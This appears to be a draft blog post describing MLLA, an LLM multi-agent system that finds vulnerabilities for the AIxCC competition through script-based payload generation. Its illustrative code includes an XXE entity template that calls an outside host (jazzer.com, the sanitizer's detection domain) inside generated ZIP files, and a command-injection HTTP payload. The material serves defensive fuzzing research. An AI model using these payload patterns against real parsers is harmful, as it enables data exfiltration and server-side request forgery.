---
title: "MLLA: Teaching LLMs to Hunt Bugs Like Security Researchers"
meta_title: ""
description: "Overview of Multi-Language LLM Agent (MLLA) - The most LLM-intensive vulnerability discovery system in Atlantis-Multilang"
date: 2025-08-27T10:00:00Z
image: "/images/blog/mlla/preview.png"
categories: ["Atlantis-Multilang"]
author: "Dongkwan Kim"
tags: ["mlla", "llm", "vulnerability-discovery"]
draft: true
---

## When Fuzzing Meets Intelligence

Imagine you're searching for a needle in a haystack, but the haystack is 20 million lines of code, and the needle might not even exist. That's the challenge of finding vulnerabilities in modern software. Traditional fuzzers tackle this by throwing millions of random inputs at programs, hoping something breaks. It's like trying to open a combination lock by randomly spinning the dials – it works, but it takes forever.

<span style="background-color:lightgray;color:green">Enter MLLA (Multi-Language LLM Agent), the most LLM-intensive module in our Atlantis-Multilang (UniAFL) system, designed to answer a simple question: What if we could teach AI to think like a security researcher?</span>

## The Problem with Being "Dumb and Fast"

Traditional fuzzing has been incredibly successful – it's found thousands of critical vulnerabilities in everything from operating systems to web browsers. But it has a fundamental limitation: it doesn't understand what it's doing. A fuzzer doesn't know that `ProcessBuilder` in Java can execute system commands, or that deserializing untrusted data is dangerous. It just mutates bytes and hopes for crashes.

This becomes especially problematic when:
- **Complex validation logic** guards the vulnerable code (think nested if statements checking formats, lengths, and magic values)
- **Semantic correctness** is required (you can't just spray random bytes at a JSON parser)
- **State matters** (vulnerabilities that only trigger after specific sequences of operations)
- **Multiple languages** are involved (modern systems mix C, Java, Python, and more)

In the AIxCC competition, we faced all these challenges simultaneously. The traditional approach of "mutate and pray" wasn't going to cut it.

## MLLA in the Atlantis-Multilang Ecosystem

As we described in our [UniAFL overview post](https://team-atlanta.github.io/blog/post-crs-multilang/), Atlantis-Multilang consists of six input generation modules with varying levels of LLM usage:

- **No LLMs**: Given Fuzzer, Hybrid Fuzzer
- **Limited LLM Usage**: Dictionary-Based, TestLang-Based, MLLA-Standalone
- **Full LLM Power**: MLLA

<span style="background-color:lightgray;color:green">MLLA represents the pinnacle of our LLM integration – it's the module that pushes the boundaries of what's possible when you fully embrace AI-assisted vulnerability discovery.</span> While other modules use LLMs for specific tasks like dictionary generation or input format analysis, MLLA employs a coordinated multi-agent system where LLMs drive the entire vulnerability discovery pipeline.

## MLLA: A Team of Specialized AI Agents

Instead of building one massive AI system that tries to do everything, MLLA takes a different approach: it assembles a team of specialized agents, each focused on a specific aspect of vulnerability discovery. Think of it as assembling a heist crew where each member has a unique skill.

### 🎯 The Architecture

{{< image src="images/blog/mlla/overview.png" position="center" class="img-fluid" caption="MLLA's multi-agent architecture orchestrating vulnerability discovery" >}}

At its core, MLLA orchestrates five key agents that work together:

- <h3>📍 Call Graph Parser Agent (CGPA): The Navigator</h3>
    Ever tried to understand a massive codebase where functions call functions that call other functions across dozens of files? CGPA is like having a GPS for code. It resolves ambiguous function references, maps relationships between code components, and ensures other agents don't get lost in the complexity. When an agent asks "where does this function live?", CGPA has the answer.

- <h3>🔍 CP Understanding Agent (CPUA): The Scout</h3>
    Before you can find vulnerabilities, you need to know where to look. CPUA analyzes harness files (the entry points to the program) and identifies which functions deserve attention. It's like a reconnaissance expert who surveys the terrain and marks points of interest. Instead of blindly analyzing millions of functions, CPUA helps MLLA focus on the ones that actually process untrusted input.

- <h3>🗺️ Make Call Graph Agent (MCGA): The Cartographer</h3>
    MCGA builds detailed maps of how functions call each other, creating what we call interprocedural call graphs. But it doesn't just map connections – it also identifies "sinks" (dangerous operations like system calls or deserialization). It's simultaneously asking "how do functions connect?" and "where are the danger zones?"

- <h3>🎯 Bug Candidate Detection Agent (BCDA): The Detective</h3>
    Not every dangerous operation is actually exploitable. BCDA is the skeptic of the group, carefully analyzing potential vulnerabilities to determine if they're real threats. It traces execution paths, identifies triggering conditions, and produces what we call BITs (Bug-Inducing Things) – structured descriptions of actual vulnerabilities with concrete exploitation requirements.

- <h3>💣 Blob Generation Agent (BGA): The Demolition Expert</h3>
    Once we know where vulnerabilities are and how to reach them, BGA creates the actual exploits. But here's the clever part: instead of generating raw binary payloads, <span style="background-color:lightgray;color:green">BGA writes Python scripts that generate payloads</span>. It's like writing a recipe instead of baking a cake – more flexible, more powerful, and easier to debug.

## The Secret Sauce: Script-Based Exploitation

One of MLLA's key innovations is how it generates exploits. Traditional approaches either use dumb mutation (change random bytes) or try to directly generate complete exploits (often failing due to complexity). MLLA takes a middle path:

```python
def create_payload() -> bytes:
    # BGA generates functions like this that construct exploits
    payload = b"HTTP/1.1\r\n"
    payload += b"x-evil-backdoor: " + sha256(b"breakin the law").digest()
    payload += b"\r\nContent-Length: 42\r\n\r\n"
    payload += construct_command_injection("jazzer")
    return payload
```

This approach allows MLLA to:
- Handle complex formats (JSON, XML, Protocol Buffers)
- Incorporate dynamic values (checksums, lengths, timestamps)
- Document the exploitation logic
- Iterate and refine based on feedback

**Integration with UniAFL:** The blobs and scripts generated by MLLA don't exist in isolation – they feed directly into UniAFL's fuzzing infrastructure. BGA's binary payloads go to the Input Executor for immediate testing, while the Python generator and mutator scripts are handled by the Script Executor, which runs them to produce continuous streams of payload variations. This integration means MLLA's intelligent outputs become seeds and mutations for the entire UniAFL fuzzing campaign, amplifying the impact across all fuzzing processes.

## Real-World Example: When MLLA Gets Sophisticated

To truly understand MLLA's power, let's look at a real example from AIxCC competition round 3. The target: **XML External Entity (XXE) vulnerabilities in Apache Tika's newly introduced 3DXML parser** – a feature that processes ZIP-based CAD files containing XML manifests and 3D model data.

### The Challenge
This particular vulnerability required understanding Apache Tika's new 3DXML processing pipeline:
1. **Multi-layer validation**: ZIP structure must be valid before XML parsing begins
2. **Format complexity**: ZIP files need proper headers, central directories, CRC32 checksums
3. **Manifest structure**: The ZIP must contain a valid `Manifest.xml` pointing to a `.3dxml` root file
4. **XML parsing chain**: The root file gets parsed by a SAX parser, creating XXE opportunities
5. **Sanitizer evasion**: The exploit must target `jazzer.com` to trigger Jazzer's detection

Here's the kind of generator MLLA produces:

```python
def generate(rnd: random.Random) -> bytes:
    """Generate XXE payloads embedded in valid ZIP files.
    
    This demonstrates MLLA's approach: not just generating XML,
    but orchestrating complex multi-format attacks.
    """
    
    # Step 1: Choose attack strategy intelligently
    strategy = rnd.choice(['basic_xxe', 'xinclude', 'schema_ref', 'dtd_external'])
    
    # Step 2: Create valid ZIP container structure
    root_filename = rnd.choice(['root.xml', 'data.xml', 'content.xml'])
    manifest = create_manifest(root_filename)
    
    # Step 3: Generate XXE payload based on strategy
    if strategy == 'basic_xxe':
        xml_content = create_xxe_entity(rnd)
    elif strategy == 'xinclude':
        xml_content = create_xinclude_attack(rnd) 
    # ... other strategies
    
    # Step 4: Build complete ZIP file with proper binary structure
    return create_zip([('Manifest.xml', manifest), (root_filename, xml_content)], rnd)

def create_xxe_entity(rnd):
    """Generate XXE with external entity targeting jazzer.com"""
    port = rnd.choice([80, 443, 8080, 8443])
    path = rnd.choice(['', '/test', '/data.xml', '/api/endpoint'])
    
    return f'''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE root [
    <!ENTITY xxe SYSTEM "http://jazzer.com:{port}{path}">
]>
<root>&xxe;</root>'''.encode('utf-8')

def create_zip(files, rnd):
    """Construct valid ZIP with proper headers, compression, CRC32..."""
    # This is where the binary format mastery happens
    zip_data = bytearray()
    
    for filename, content in files:
        # Choose compression strategy
        compress_level = rnd.choice([0, 1, 6, 9])  
        compressed = zlib.compress(content, compress_level) if compress_level else content
        
        # Build ZIP headers with proper signatures and metadata
        header = struct.pack('<I', 0x04034b50)  # ZIP local file header
        header += struct.pack('<H', 20)         # Version needed  
        header += struct.pack('<H', 0)          # Flags
        header += struct.pack('<H', 8 if compress_level else 0)  # Compression method
        header += struct.pack('<I', zlib.crc32(content) & 0xffffffff)  # CRC32
        # ... complete ZIP specification implementation
        
        zip_data.extend(header + filename.encode() + compressed)
    
    # Add central directory and end-of-central-directory records
    zip_data.extend(build_central_directory(files))
    return bytes(zip_data)
```

### What Makes This Different?

Look at what this generator accomplishes in a single function: it's not just creating random XML files or mutating ZIP bytes. It's orchestrating a complete multi-format attack that traditional fuzzing would struggle to achieve.

**First, there's the format juggling act.** The generator has to be fluent in both ZIP and XML simultaneously. It creates valid ZIP headers with proper CRC32 checksums and compression while embedding perfectly formed XML with complex XXE syntax. Try explaining to a random mutator how to maintain both ZIP structural integrity AND XML semantic correctness while crafting an exploit – it's like asking someone to play chess and poker at the same time.

**Second, it's thinking strategically, not randomly.** Notice how it chooses attack vectors (`basic_xxe`, `xinclude`, `schema_ref`) and varies parameters intelligently – common ports like 443 for higher success probability, but also uncommon ones like 8443 to explore edge cases. It's not uniform randomness; it's informed exploration based on what a security researcher would try.

The real breakthrough is that <span style="background-color:lightgray;color:green">MLLA generates *attack strategies*, not just attack payloads</span>. Each generator function is essentially a condensed security researcher's playbook, encoded in executable Python that can run thousands of variations.

Traditional fuzzing would need millions of random mutations to stumble upon:
- A valid ZIP file structure 
- With properly embedded XML
- That contains working XXE syntax
- Targeting the exact domain that triggers detection

MLLA does all of this systematically in a single generator that adapts its approach based on what it learns about the target. **This is exactly why MLLA contributed 7 unique POVs in AIxCC** – vulnerabilities that required this kind of strategic, format-aware thinking to discover.

## Two Modes, One System

MLLA operates in two complementary modes that work together to maximize vulnerability discovery:

### 🚀 **Standalone Mode: Fast and Broad**
When you need to quickly explore a new codebase, MLLA's standalone mode kicks into action. It:
- Analyzes only the harness file (no deep call graph analysis)
- Generates diverse seeds using the same script-based approach
- Operates with minimal setup and resource requirements
- Provides rapid coverage of the vulnerability search space

Think of it as MLLA's reconnaissance mode – quickly surveying the terrain and generating interesting inputs to get fuzzing started.

### 🔬 **Full Pipeline Mode: Deep and Targeted**  
When standalone mode or other fuzzing modules discover interesting crash sites or code paths, the full MLLA pipeline engages:
- All five agents (CGPA, CPUA, MCGA, BCDA, BGA) work in concert
- Builds comprehensive call graphs and identifies precise vulnerability paths  
- Generates highly targeted exploits for specific bug candidates
- Employs sophisticated static analysis and LLM reasoning

This is MLLA's surgical mode – taking interesting leads and turning them into concrete, exploitable vulnerabilities.

### 🎯 **Working Together**
In practice, both modes complement each other and the other UniAFL modules:
- Standalone mode contributes to the general seed pool, helping all fuzzers find more interesting paths
- Full pipeline mode activates when any module (including standalone) discovers potential vulnerabilities
- The combined approach contributed **7 unique POVs** in the AIxCC finals – bugs that neither traditional fuzzing nor single-shot LLM approaches could find alone

This dual-mode design reflects a key insight: <span style="background-color:lightgray;color:green">effective AI-assisted vulnerability discovery isn't about replacing traditional approaches, but about intelligently augmenting them at the right moments with the right level of AI involvement.</span>

## How It All Comes Together

The magic happens when these agents work as a team:

1. **CPUA** scouts the harness to identify entry points with tainted data flow
2. **MCGA** maps the code landscape, building call graphs and finding sinks
3. **CGPA** provides navigation support, resolving any ambiguous code references
4. **BCDA** investigates potential vulnerabilities, filtering out false positives
5. **BGA** crafts targeted exploits for confirmed vulnerabilities

Throughout this process, the agents share information through a distributed cache, avoiding duplicate work and building on each other's discoveries. When one agent finds something interesting, others can immediately leverage that knowledge.

## How Did MLLA Perform?

When the AIxCC finals dust settled, the results spoke for themselves. <span style="background-color:lightgray;color:green">MLLA (including standalone mode) discovered 7 unique POVs</span> – vulnerabilities that required the kind of strategic, format-aware thinking we've been discussing.

These weren't simple crashes that any fuzzer could find. They were complex bugs hidden behind validation layers, requiring precise understanding of file formats, protocol structures, and semantic relationships between different parts of the code. MLLA's script-based approach proved especially effective for structured input formats where maintaining correctness while exploring vulnerabilities is crucial.

## Challenges We Overcame

Building the most LLM-intensive module came with unique challenges:

- **LLM Costs**: With five agents making numerous LLM calls, costs could spiral. We carefully optimized prompts and used caching extensively.
- **Latency**: LLM calls are slow compared to traditional fuzzing mutations. We addressed this with asynchronous execution and parallel agent operation.
- **Hallucinations**: More LLM usage means more opportunities for hallucination. We built extensive validation layers and cross-checking between agents.
- **Context Management**: Complex vulnerabilities require large context windows. We developed techniques to compress and prioritize information.

## The Power of Choice

One of UniAFL's strengths is its modular design with varying LLM dependency levels. In scenarios where:
- **LLM access is limited**: Use Given Fuzzer and Hybrid Fuzzer
- **LLM budget is constrained**: Deploy Dictionary-Based and TestLang-Based modules
- **Maximum effectiveness is needed**: Unleash MLLA's full capabilities

This flexibility meant we could adapt to competition constraints while still leveraging LLMs where they provided the most value.

## Looking Forward

MLLA represents the current frontier of LLM-powered vulnerability discovery, but it's just the beginning. As language models become more capable and accessible, we envision:
- Agents that learn from each discovered vulnerability to find similar issues faster
- Real-time collaboration between human researchers and AI agents
- Cross-program analysis that identifies vulnerability patterns across entire ecosystems
- Automatic patch generation that accompanies each discovered vulnerability

## What's Next?

This post provided a high-level overview of MLLA as the most LLM-intensive component of Atlantis-Multilang. In upcoming posts, we'll dive deep into each component:

- <h5>🗺️ Code Understanding & Navigation: How CPUA, MCGA, and CGPA work together to map and analyze massive codebases</h5>
- <h5>🔬 The Detective Work: BCDA's techniques for distinguishing real vulnerabilities from false positives</h5>
- <h5>🛠️ The Exploit Factory: BGA's three-agent framework (BlobGen, Generator, Mutator) and why script-based generation outperforms direct payload creation</h5>
- <h5>🧠 Context Engineering: How MLLA prompts LLMs effectively and manages context windows for vulnerability discovery</h5>

Want to explore further?
- [<h5>🌐 Check out the complete MLLA source code</h5>](https://github.com/Team-Atlanta/aixcc-afc-atlantis/tree/main/example-crs-webservice/crs-multilang/blob-gen/multilang-llm-agent)
- [<h5>📖 Read about UniAFL, MLLA's parent system</h5>](https://team-atlanta.github.io/blog/post-crs-multilang/)

The future of vulnerability discovery isn't just about being faster or covering more code – it's about being smarter. MLLA demonstrates that by fully embracing LLM capabilities while maintaining a pragmatic, modular architecture, we can find vulnerabilities that neither traditional fuzzing nor simple LLM prompting could discover alone.

*Stay tuned for our deep dives into each MLLA component, where we'll share the technical details, implementation challenges, and lessons learned from building the most ambitious LLM-powered vulnerability hunter in the AIxCC competition.*
